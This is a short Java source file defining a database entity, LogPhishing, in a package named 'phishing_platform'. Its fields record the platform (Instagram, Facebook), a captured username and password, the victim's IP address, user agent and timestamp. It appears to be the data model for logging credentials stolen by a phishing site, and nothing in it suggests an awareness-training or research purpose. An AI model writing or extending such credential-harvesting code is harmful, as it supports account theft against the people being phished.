package com.example.phishing_platform.model;

import jakarta.persistence.*;
import lombok.Data;
import java.time.LocalDateTime;

@Entity
@Data
public class LogPhishing {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    private String plataforma; // Instagram, Facebook, etc
    private String username;
    private String password;
    private String ip;
    private String userAgent;
    private LocalDateTime dataHora;
}

